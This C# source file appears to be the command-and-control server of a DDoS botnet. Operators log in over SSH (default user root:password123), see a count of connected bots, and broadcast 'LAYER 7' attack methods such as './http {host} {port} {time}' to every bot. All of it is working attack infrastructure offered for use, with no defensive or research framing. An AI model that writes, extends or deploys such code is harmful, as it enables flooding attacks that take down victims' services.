using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using FxSsh;
using FxSsh.Services;

namespace Agent
{
    public class UserConfig
    {
        [JsonPropertyName("username")]
        public string Username { get; set; } = string.Empty;

        [JsonPropertyName("password")]
        public string Password { get; set; } = string.Empty;
    }

    public class MethodConfig
    {
        [JsonPropertyName("name")]
        public string Name { get; set; } = string.Empty;

        [JsonPropertyName("cmd")]
        public string Cmd { get; set; } = string.Empty;
    }

    public class LineEditorState
    {
        public StringBuilder Buffer { get; } = new();
        public int CursorPos { get; set; } = 0;
        public List<string> History { get; } = new();
        public int HistoryIndex { get; set; } = -1;
        public string SavedCurrentInput { get; set; } = string.Empty;
        public List<byte> EscapeSeq { get; } = new();
        public bool InEscape { get; set; } = false;
    }

    internal class Program
    {
        private static int _port = 1337;
        private static int _internalSshPort = 0;
        private static int _botCount = 0;
        private static List<UserConfig> _users = new();
        private static List<MethodConfig> _methods = new();
        private static readonly ConcurrentDictionary<Channel, LineEditorState> _sessionStates = new();
        private static readonly ConcurrentDictionary<Channel, string> _channelUsers = new();
        private static readonly ConcurrentDictionary<TcpClient, NetworkStream> _botStreams = new();
        private static readonly ConcurrentDictionary<TcpClient, bool> _activeProxyClients = new();
        private static TcpListener? _mainListener;

        private static string GetTitleSequence() => $"\x1b]0;Connected {_botCount}\x07";

        static void Main(string[] args)
        {
            ParseArguments(args);
            LoadUsers();
            LoadMethods();

            // Bind internal SSH server to loopback on random free port
            var sshListener = new TcpListener(IPAddress.Loopback, 0);
            sshListener.Start();
            _internalSshPort = ((IPEndPoint)sshListener.LocalEndpoint).Port;
            sshListener.Stop();

            var startingInfo = new StartingInfo(IPAddress.Loopback, _internalSshPort, "SSH-2.0-AgentSSH");
            var server = new SshServer(startingInfo);

            string rsaKey = GetOrGenerateKey("hostkey_rsa.pem", () => KeyGenerator.GenerateRsaKeyPem(2048));
            server.AddHostKey("ssh-rsa", rsaKey);
            server.AddHostKey("rsa-sha2-256", rsaKey);
            server.AddHostKey("rsa-sha2-512", rsaKey);

            string ecdsaKey = GetOrGenerateKey("hostkey_ecdsa.pem", () => KeyGenerator.GenerateECDsaKeyPem("nistp256"));
            server.AddHostKey("ecdsa-sha2-nistp256", ecdsaKey);

            server.ConnectionAccepted += (sender, session) =>
            {
                session.ServiceRegistered += (s, service) =>
                {
                    if (service is UserAuthService auth)
                    {
                        auth.UserAuth += (s2, authArgs) =>
                        {
                            if (authArgs.AuthMethod == "password")
                            {
                                var matched = _users.Exists(u =>
                                    string.Equals(u.Username, authArgs.Username, StringComparison.OrdinalIgnoreCase) &&
                                    (string.IsNullOrEmpty(u.Password) || u.Password == authArgs.Password));

                                if (matched)
                                {
                                    authArgs.Result = true;
                                    Console.WriteLine($"[+] Authenticated SSH user: {authArgs.Username}");
                                }
                                else
                                {
                                    authArgs.Result = false;
                                    Console.WriteLine($"[-] Failed SSH password authentication for user: {authArgs.Username}");
                                }
                            }
                            else if (authArgs.AuthMethod == "none")
                            {
                                var matched = _users.Exists(u =>
                                    string.Equals(u.Username, authArgs.Username, StringComparison.OrdinalIgnoreCase) &&
                                    string.IsNullOrEmpty(u.Password));

                                authArgs.Result = matched;
                            }
                            else
                            {
                                authArgs.Result = false;
                            }
                        };
                    }
                    else if (service is ConnectionService conn)
                    {
                        conn.CommandOpened += (s2, cmdArgs) =>
                        {
                            cmdArgs.Agreed = true;
                            var channel = cmdArgs.Channel;
                            string username = cmdArgs.AttachedUserAuthArgs?.Username ?? "root";
                            _channelUsers[channel] = username;
                            _sessionStates[channel] = new LineEditorState();

                            channel.DataReceived += (s3, dataMem) =>
                            {
                                HandleSessionData(channel, dataMem.ToArray());
                            };

                            channel.CloseReceived += (s3, e) =>
                            {
                                _sessionStates.TryRemove(channel, out _);
                                _channelUsers.TryRemove(channel, out _);
                            };

                            string prompt = $"\x1b[2J\x1b[3J\x1b[H{GetTitleSequence()}[\x1b[94m{username}\x1b[0m@\x1b[94maihui\x1b[0m] ";
                            channel.SendData(Encoding.UTF8.GetBytes(prompt));
                        };

                        conn.PtyReceived += (s2, ptyArgs) =>
                        {
                        };

                        conn.EnvReceived += (s2, envArgs) =>
                        {
                        };
                    }
                };
            };

            server.Start();

            // Start Unified Port Listener (SSH & Bot Multiplexer on single port)
            var mainListenerThread = new Thread(() => StartMultiplexListener(_port)) { IsBackground = true };
            mainListenerThread.Start();

            Console.WriteLine($"[+] Single Port Multiplexer active on port {_port} (SSH & Bot unified)");
            Console.WriteLine("[+] Press Ctrl+C to stop.");

            var waitHandle = new ManualResetEvent(false);
            Console.CancelKeyPress += (s, e) =>
            {
                e.Cancel = true;
                _mainListener?.Stop();
                server.Stop();
                waitHandle.Set();
            };
            waitHandle.WaitOne();
        }

        private static void StartMultiplexListener(int port)
        {
            try
            {
                _mainListener = new TcpListener(IPAddress.Any, port);
                _mainListener.Start();

                while (true)
                {
                    var client = _mainListener.AcceptTcpClient();
                    var th = new Thread(() => RouteIncomingConnection(client)) { IsBackground = true };
                    th.Start();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Main multiplexer listener stopped: {ex.Message}");
            }
        }

        private static void RouteIncomingConnection(TcpClient client)
        {
            try
            {
                var socket = client.Client;
                socket.ReceiveTimeout = 10000;
                var buffer = new byte[256];

                // Read client first message
                int received = socket.Receive(buffer, 0, buffer.Length, SocketFlags.None);
                socket.ReceiveTimeout = 0;

                if (received <= 0)
                {
                    client.Close();
                    return;
                }

                if (received >= 4 &&
                    buffer[0] == (byte)'S' &&
                    buffer[1] == (byte)'S' &&
                    buffer[2] == (byte)'H' &&
                    buffer[3] == (byte)'-')
                {
                    // Client is SSH
                    ProxyToInternalSsh(client, buffer, received);
                }
                else
                {
                    // Client is Bot
                    var stream = client.GetStream();
                    HandleBotClient(client, stream, buffer, received);
                }
            }
            catch
            {
                try { client.Close(); } catch { }
            }
        }

        private static void ProxyToInternalSsh(TcpClient externalClient, byte[] prefixData, int prefixLen)
        {
            TcpClient? internalClient = null;
            try
            {
                externalClient.NoDelay = true;
                externalClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                internalClient = new TcpClient();
                internalClient.NoDelay = true;
                internalClient.Connect(IPAddress.Loopback, _internalSshPort);

                _activeProxyClients[externalClient] = true;
                _activeProxyClients[internalClient] = true;

                var extStream = externalClient.GetStream();
                var intStream = internalClient.GetStream();

                // Forward the SSH banner that was already read from external client to internal SSH server
                intStream.Write(prefixData, 0, prefixLen);

                using var cts = new CancellationTokenSource();

                var t1 = Task.Run(async () =>
                {
                    byte[] buf = new byte[8192];
                    try
                    {
                        while (!cts.Token.IsCancellationRequested)
                        {
                            int read = await extStream.ReadAsync(buf, 0, buf.Length, cts.Token);
                            if (read <= 0) break;
                            await intStream.WriteAsync(buf, 0, read, cts.Token);
                            await intStream.FlushAsync(cts.Token);
                        }
                    }
                    catch { }
                    finally
                    {
                        try { cts.Cancel(); } catch { }
                    }
                });

                var t2 = Task.Run(async () =>
                {
                    byte[] buf = new byte[8192];
                    try
                    {
                        while (!cts.Token.IsCancellationRequested)
                        {
                            int read = await intStream.ReadAsync(buf, 0, buf.Length, cts.Token);
                            if (read <= 0) break;
                            await extStream.WriteAsync(buf, 0, read, cts.Token);
                            await extStream.FlushAsync(cts.Token);
                        }
                    }
                    catch { }
                    finally
                    {
                        try { cts.Cancel(); } catch { }
                    }
                });

                Task.WaitAll(t1, t2);
            }
            catch
            {
            }
            finally
            {
                _activeProxyClients.TryRemove(externalClient, out _);
                if (internalClient != null) _activeProxyClients.TryRemove(internalClient, out _);
                try { externalClient.Close(); } catch { }
                try { internalClient?.Close(); } catch { }
            }
        }

        private static void HandleBotClient(TcpClient client, NetworkStream stream, byte[] initialData, int initialLen)
        {
            Interlocked.Increment(ref _botCount);
            UpdateConnectedTitle();
            string botId = "unknown";

            try
            {
                _botStreams[client] = stream;
                stream.ReadTimeout = 45000;

                // Process the initial data already read during routing
                string firstMsg = Encoding.UTF8.GetString(initialData, 0, initialLen).Trim();
                if (firstMsg.StartsWith("HELLO "))
                {
                    botId = firstMsg.Substring(6).Trim();
                    Console.WriteLine($"[+] Bot connected: {botId} (Total: {_botCount})");
                }

                var buffer = new byte[1024];
                while (client.Connected)
                {
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead <= 0) break;

                    string msg = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                    if (msg.StartsWith("HELLO "))
                    {
                        botId = msg.Substring(6).Trim();
                        Console.WriteLine($"[+] Bot connected: {botId} (Total: {_botCount})");
                    }
                    else if (msg == "PING")
                    {
                        byte[] pong = Encoding.UTF8.GetBytes("PONG\n");
                        stream.Write(pong, 0, pong.Length);
                    }
                }
            }
            catch
            {
            }
            finally
            {
                _botStreams.TryRemove(client, out _);
                client.Close();
                Interlocked.Decrement(ref _botCount);
                UpdateConnectedTitle();
                Console.WriteLine($"[-] Bot disconnected: {botId} (Total: {_botCount})");
            }
        }

        private static void UpdateConnectedTitle()
        {
            string titleSeq = GetTitleSequence();
            byte[] titleBytes = Encoding.UTF8.GetBytes(titleSeq);
            foreach (var channel in _channelUsers.Keys)
            {
                try
                {
                    channel.SendData(titleBytes);
                }
                catch
                {
                }
            }
        }

        private static void ParseArguments(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if ((args[i] == "-p" || args[i] == "--port") && i + 1 < args.Length)
                {
                    if (int.TryParse(args[i + 1], out int p))
                    {
                        _port = p;
                        i++;
                    }
                }
            }
        }

        private static void LoadUsers()
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "users.json");
            if (!File.Exists(path))
            {
                path = "users.json";
            }

            if (File.Exists(path))
            {
                try
                {
                    string json = File.ReadAllText(path);
                    _users = JsonSerializer.Deserialize<List<UserConfig>>(json) ?? new List<UserConfig>();
                    Console.WriteLine($"[+] Loaded {_users.Count} user(s) from users.json");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error parsing users.json: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine("[!] users.json not found, creating default user root:password123");
                _users = new List<UserConfig> { new UserConfig { Username = "root", Password = "password123" } };
                File.WriteAllText("users.json", JsonSerializer.Serialize(_users, new JsonSerializerOptions { WriteIndented = true }));
            }
        }

        private static void LoadMethods()
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "methods.json");
            if (!File.Exists(path))
            {
                path = "methods.json";
            }

            if (File.Exists(path))
            {
                try
                {
                    string json = File.ReadAllText(path);
                    _methods = JsonSerializer.Deserialize<List<MethodConfig>>(json) ?? new List<MethodConfig>();
                    Console.WriteLine($"[+] Loaded {_methods.Count} method(s) from methods.json");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error parsing methods.json: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine("[!] methods.json not found, creating default method");
                _methods = new List<MethodConfig>
                {
                    new MethodConfig { Name = "http", Cmd = "./http {host} {port} {time}" }
                };
                File.WriteAllText("methods.json", JsonSerializer.Serialize(_methods, new JsonSerializerOptions { WriteIndented = true }));
            }
        }

        private static void HandleSessionData(Channel channel, byte[] data)
        {
            if (!_sessionStates.TryGetValue(channel, out var state))
            {
                state = new LineEditorState();
                _sessionStates[channel] = state;
            }

            _channelUsers.TryGetValue(channel, out var username);
            if (string.IsNullOrEmpty(username)) username = "root";

            for (int i = 0; i < data.Length; i++)
            {
                byte b = data[i];

                if (b == 0x1B) // ESC
                {
                    state.InEscape = true;
                    state.EscapeSeq.Clear();
                    state.EscapeSeq.Add(b);
                    continue;
                }

                if (state.InEscape)
                {
                    state.EscapeSeq.Add(b);

                    // If sequence starts with \x1b[
                    if (state.EscapeSeq.Count >= 2 && state.EscapeSeq[0] == 0x1B && state.EscapeSeq[1] == (byte)'[')
                    {
                        // Final characters for CSI are typically @ through ~ (0x40 - 0x7E)
                        if (state.EscapeSeq.Count >= 3 && b >= 0x40 && b <= 0x7E)
                        {
                            HandleEscapeSequence(channel, state, state.EscapeSeq);
                            state.InEscape = false;
                            state.EscapeSeq.Clear();
                        }
                    }
                    else if (state.EscapeSeq.Count >= 2 && state.EscapeSeq[0] == 0x1B && (state.EscapeSeq[1] == (byte)'O' || state.EscapeSeq[1] == (byte)'N'))
                    {
                        if (state.EscapeSeq.Count >= 3)
                        {
                            HandleEscapeSequence(channel, state, state.EscapeSeq);
                            state.InEscape = false;
                            state.EscapeSeq.Clear();
                        }
                    }
                    else if (state.EscapeSeq.Count > 10)
                    {
                        state.InEscape = false;
                        state.EscapeSeq.Clear();
                    }
                    continue;
                }

                if (b == '\r' || b == '\n')
                {
                    channel.SendData(Encoding.UTF8.GetBytes("\r\n"));

                    string command = state.Buffer.ToString().Trim();
                    if (!string.IsNullOrEmpty(command))
                    {
                        // Add to history (avoid consecutive duplicates)
                        if (state.History.Count == 0 || state.History[state.History.Count - 1] != command)
                        {
                            state.History.Add(command);
                        }
                    }

                    state.Buffer.Clear();
                    state.CursorPos = 0;
                    state.HistoryIndex = -1;
                    state.SavedCurrentInput = string.Empty;

                    if (!string.IsNullOrEmpty(command))
                    {
                        ProcessCommand(channel, command);
                    }

                    channel.SendData(Encoding.UTF8.GetBytes($"{GetTitleSequence()}[\x1b[94m{username}\x1b[0m@\x1b[94maihui\x1b[0m] "));
                }
                else if (b == 0x08 || b == 0x7F) // Backspace
                {
                    if (state.CursorPos > 0)
                    {
                        state.Buffer.Remove(state.CursorPos - 1, 1);
                        state.CursorPos--;

                        // Redraw from cursor pos to end of line, then move cursor back
                        string remaining = state.Buffer.ToString().Substring(state.CursorPos) + " ";
                        string backSequence = new string('\b', remaining.Length);
                        channel.SendData(Encoding.UTF8.GetBytes($"\b{remaining}{backSequence}"));
                        if (state.CursorPos < state.Buffer.Length)
                        {
                            int shift = state.Buffer.Length - state.CursorPos;
                            channel.SendData(Encoding.UTF8.GetBytes(new string('\b', shift)));
                        }
                    }
                }
                else if (b == 0x03) // Ctrl+C
                {
                    state.Buffer.Clear();
                    state.CursorPos = 0;
                    state.HistoryIndex = -1;
                    state.SavedCurrentInput = string.Empty;

                    channel.SendData(Encoding.UTF8.GetBytes("^C\r\n"));
                    channel.SendData(Encoding.UTF8.GetBytes($"{GetTitleSequence()}[\x1b[94m{username}\x1b[0m@\x1b[94maihui\x1b[0m] "));
                }
                else if (b >= 32 && b <= 126) // Printable characters
                {
                    char c = (char)b;
                    if (state.CursorPos == state.Buffer.Length)
                    {
                        state.Buffer.Append(c);
                        state.CursorPos++;
                        channel.SendData(new byte[] { b });
                    }
                    else
                    {
                        state.Buffer.Insert(state.CursorPos, c);
                        state.CursorPos++;
                        string tail = state.Buffer.ToString().Substring(state.CursorPos - 1);
                        int shift = state.Buffer.Length - state.CursorPos;
                        string moveBack = shift > 0 ? new string('\b', shift) : "";
                        channel.SendData(Encoding.UTF8.GetBytes(tail + moveBack));
                    }
                }
            }
        }

        private static void HandleEscapeSequence(Channel channel, LineEditorState state, List<byte> seq)
        {
            string s = Encoding.ASCII.GetString(seq.ToArray());

            if (s == "\x1b[A" || s == "\x1bOA" || s.EndsWith("A")) // UP Arrow
            {
                if (state.History.Count == 0) return;

                if (state.HistoryIndex == -1)
                {
                    state.SavedCurrentInput = state.Buffer.ToString();
                    state.HistoryIndex = state.History.Count - 1;
                }
                else if (state.HistoryIndex > 0)
                {
                    state.HistoryIndex--;
                }

                SetInputBuffer(channel, state, state.History[state.HistoryIndex]);
            }
            else if (s == "\x1b[B" || s == "\x1bOB" || s.EndsWith("B")) // DOWN Arrow
            {
                if (state.HistoryIndex == -1) return;

                if (state.HistoryIndex < state.History.Count - 1)
                {
                    state.HistoryIndex++;
                    SetInputBuffer(channel, state, state.History[state.HistoryIndex]);
                }
                else
                {
                    state.HistoryIndex = -1;
                    SetInputBuffer(channel, state, state.SavedCurrentInput);
                }
            }
            else if (s == "\x1b[C" || s == "\x1bOC" || s.EndsWith("C")) // RIGHT Arrow
            {
                if (state.CursorPos < state.Buffer.Length)
                {
                    state.CursorPos++;
                    channel.SendData(Encoding.ASCII.GetBytes("\x1b[C"));
                }
            }
            else if (s == "\x1b[D" || s == "\x1bOD" || s.EndsWith("D")) // LEFT Arrow
            {
                if (state.CursorPos > 0)
                {
                    state.CursorPos--;
                    channel.SendData(Encoding.ASCII.GetBytes("\x1b[D"));
                }
            }
            else if (s == "\x1b[H" || s == "\x1b[1~" || s == "\x1b[7~") // HOME Key
            {
                if (state.CursorPos > 0)
                {
                    channel.SendData(Encoding.ASCII.GetBytes($"\x1b[{state.CursorPos}D"));
                    state.CursorPos = 0;
                }
            }
            else if (s == "\x1b[F" || s == "\x1b[4~" || s == "\x1b[8~") // END Key
            {
                int diff = state.Buffer.Length - state.CursorPos;
                if (diff > 0)
                {
                    channel.SendData(Encoding.ASCII.GetBytes($"\x1b[{diff}C"));
                    state.CursorPos = state.Buffer.Length;
                }
            }
            else if (s == "\x1b[3~") // DELETE Key
            {
                if (state.CursorPos < state.Buffer.Length)
                {
                    state.Buffer.Remove(state.CursorPos, 1);
                    string tail = state.Buffer.ToString().Substring(state.CursorPos) + " ";
                    int shift = state.Buffer.Length - state.CursorPos + 1;
                    string moveBack = new string('\b', shift);
                    channel.SendData(Encoding.UTF8.GetBytes(tail + moveBack));
                }
            }
        }

        private static void SetInputBuffer(Channel channel, LineEditorState state, string newText)
        {
            // Move cursor to start of buffer
            if (state.CursorPos > 0)
            {
                channel.SendData(Encoding.ASCII.GetBytes($"\x1b[{state.CursorPos}D"));
            }

            // Clear to end of line
            channel.SendData(Encoding.ASCII.GetBytes("\x1b[K"));

            // Replace buffer
            state.Buffer.Clear();
            state.Buffer.Append(newText);
            state.CursorPos = newText.Length;

            // Render new text
            channel.SendData(Encoding.UTF8.GetBytes(newText));
        }

        private static void ProcessCommand(Channel channel, string command)
        {
            var parts = command.Split(' ', StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 0) return;

            string cmdName = parts[0];

            if (cmdName.Equals("help", StringComparison.OrdinalIgnoreCase))
            {
                var sb = new StringBuilder();
                sb.AppendLine("\x1b[92m--- Available Commands ---\x1b[0m");
                sb.AppendLine("  help              Show this help menu");
                sb.AppendLine("  methods           List attack/execution methods");
                sb.AppendLine("  bots              Show number of connected bots");
                sb.AppendLine("  clear / cls       Clear terminal screen");
                sb.AppendLine("  exit / quit       Disconnect session");
                channel.SendData(Encoding.UTF8.GetBytes(sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n")));
            }
            else if (cmdName.Equals("methods", StringComparison.OrdinalIgnoreCase))
            {
                var sb = new StringBuilder();
                sb.AppendLine("\x1b[92m--- Methods List ---\x1b[0m");
                if (_methods.Count == 0)
                {
                    sb.AppendLine("  (No methods configured)");
                }
                else
                {
                    sb.AppendLine("\x1b[93m[LAYER 7]\x1b[0m");
                    foreach (var m in _methods)
                    {
                        sb.AppendLine($"  \x1b[96m{m.Name}\x1b[0m");
                    }
                }
                channel.SendData(Encoding.UTF8.GetBytes(sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n")));
            }
            else if (cmdName.Equals("bots", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.UTF8.GetBytes($"[+] Total connected bots: {_botCount}\r\n"));
            }
            else if (cmdName.Equals("clear", StringComparison.OrdinalIgnoreCase) || cmdName.Equals("cls", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.ASCII.GetBytes("\x1b[2J\x1b[3J\x1b[H"));
            }
            else if (cmdName.Equals("exit", StringComparison.OrdinalIgnoreCase) || cmdName.Equals("quit", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.UTF8.GetBytes("Goodbye!\r\n"));
                channel.SendClose();
            }
            else
            {
                var method = _methods.Find(m => string.Equals(m.Name, cmdName, StringComparison.OrdinalIgnoreCase));
                if (method != null)
                {
                    var placeholders = ExtractPlaceholders(method.Cmd);
                    var args = new string[parts.Length - 1];
                    Array.Copy(parts, 1, args, 0, parts.Length - 1);

                    if (args.Length < placeholders.Count)
                    {
                        string usage = string.Join(" ", placeholders);
                        channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Usage: {method.Name} {usage}\x1b[0m\r\n"));
                        return;
                    }

                    string formattedCmd = method.Cmd;
                    for (int i = 0; i < placeholders.Count; i++)
                    {
                        formattedCmd = formattedCmd.Replace(placeholders[i], args[i]);
                    }

                    int dispatched = BroadcastToBots(formattedCmd);
                    channel.SendData(Encoding.UTF8.GetBytes($"\x1b[92m[+] Dispatched '{formattedCmd}' to {dispatched} bot(s).\x1b[0m\r\n"));
                }
                else
                {
                    channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Unknown command: {cmdName}. Type 'help' for available commands.\x1b[0m\r\n"));
                }
            }
        }

        private static List<string> ExtractPlaceholders(string template)
        {
            var list = new List<string>();
            var matches = System.Text.RegularExpressions.Regex.Matches(template, @"\{[^}]+\}");
            foreach (System.Text.RegularExpressions.Match match in matches)
            {
                list.Add(match.Value);
            }
            return list;
        }

        private static int BroadcastToBots(string command)
        {
            byte[] data = Encoding.UTF8.GetBytes(command + "\n");
            int count = 0;
            foreach (var kvp in _botStreams)
            {
                try
                {
                    kvp.Value.Write(data, 0, data.Length);
                    count++;
                }
                catch
                {
                }
            }
            return count;
        }

        private static string GetOrGenerateKey(string fileName, Func<string> generateKey)
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
            if (File.Exists(path))
            {
                return File.ReadAllText(path);
            }

            if (File.Exists(fileName))
            {
                return File.ReadAllText(fileName);
            }

            string newKey = generateKey();
            try
            {
                File.WriteAllText(path, newKey);
            }
            catch
            {
                File.WriteAllText(fileName, newKey);
            }
            return newKey;
        }
    }
}
